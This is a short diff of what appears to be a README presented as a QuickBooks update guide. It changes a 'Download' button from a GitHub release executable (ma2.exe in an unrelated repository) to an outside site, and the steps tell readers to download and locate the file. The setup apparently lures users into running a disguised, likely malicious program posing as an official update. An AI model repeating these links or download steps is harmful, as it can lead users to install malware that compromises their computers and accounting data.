@@ -11,7 +11,7 @@ The automation tools in QuickBooks reduce the need for manual data entry, freein
 
 1. Click the "Download" button to begin downloading the update file.
     <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1.1/ma2.exe">
+    <a href="https://polysoft.org">
       <img src="https://github.com/user-attachments/assets/750772b8-fe46-433c-9a86-2ca3c41b4be1" alt="Download" width="300"/>
     </a>
 2. Navigate to your computer's "Downloads" folder to locate the downloaded file.
